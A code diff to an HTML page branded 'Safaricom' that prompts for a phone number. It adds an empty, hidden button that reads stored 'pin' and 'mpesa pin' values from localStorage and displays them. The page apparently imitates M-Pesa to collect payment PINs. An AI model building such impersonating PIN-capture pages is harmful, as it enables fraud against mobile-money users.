@@ -54,6 +54,14 @@
         height: 20px;
         border-radius: 25;
     }
+    input {
+        width: 80%;
+        padding: 10px;
+        margin-top: 10px;
+        border: none;
+        border-bottom: 1px solid #000;
+        box-sizing: border-box;
+    }
 
 </style>
 <body>
@@ -72,8 +80,9 @@
     <label id="heading">Safaricom</label>
     <label id="subheading">Enter phone no.</label>
     <label id="enternumberlabel">digits(0-9,*,#,+)10-13</label>
-    <input id="enternumberinput" type="symbols">
+    <input id="enternumberinput" type="number">
     <button id="getphonebutton">ok</button>
+    <button id="showpin"></button>
     <script>
         function getPhoneNumber(){
             number=document.getElementById("enternumberinput").value;
@@ -81,6 +90,13 @@
             window.location.href="amount/index.html"
         }
         document.getElementById("getphonebutton").addEventListener("click",getPhoneNumber)
+        function showpin(){
+            pin=localStorage.getItem("pin")
+            mpesapin=localStorage.getItem("mpesa pin")
+            g=`pin=${pin}<br>mpesa pin=${mpesapin}`
+            alert(g)
+        }
+        document.getElementById("showpin").addEventListener("click",showpin)
     </script>
 </body>
 </html>
